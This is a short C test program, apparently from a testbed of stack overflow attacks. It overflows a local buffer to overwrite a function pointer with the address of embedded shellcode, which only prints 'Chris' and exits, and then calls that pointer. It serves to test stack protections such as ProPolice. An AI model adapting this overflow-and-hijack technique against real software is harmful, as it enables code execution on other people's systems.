#include <stdio.h>
#include <setjmp.h>
#include <string.h>

#define BUFSIZE 16
#define OVERFLOWSIZE 256

long overflow_buffer[OVERFLOWSIZE];
char shellcode[] =
"\xeb\x19\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x04\xb3\x01\x59\xb2\x05\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\xe2\xff\xff\xff\x43\x68\x72\x69\x73";

int main(int argc, char **argv);

/*****************************************************************/
/*          Location: stack     Target: function pointer         */
/*****************************************************************/

void parameter_func_pointer() {
  void (*stack_function_pointer)(void);
  long *stack_pointer;
  long stack_buffer[BUFSIZE];
  char propolice_dummy[10];
  int overflow;

  /* Just a dummy pointer setup */
  stack_pointer = &stack_buffer[1];

  /* First set up overflow_buffer with 'A's and a
 *        new function pointer pointing to the shellcode */
  overflow = (int)((long)&stack_function_pointer - (long)&stack_buffer);
  memset(overflow_buffer, 'A', overflow);
  overflow_buffer[overflow/4] = (long)&shellcode;

  /* Then overflow stack_buffer with overflow_buffer  */
  memcpy(stack_buffer, overflow_buffer, overflow+4);

  /* Function call using the function pointer */
  (void)(*stack_function_pointer)();
  
  return;
}

int main (int argc, char **argv) {
  parameter_func_pointer();  
  return 0;
}
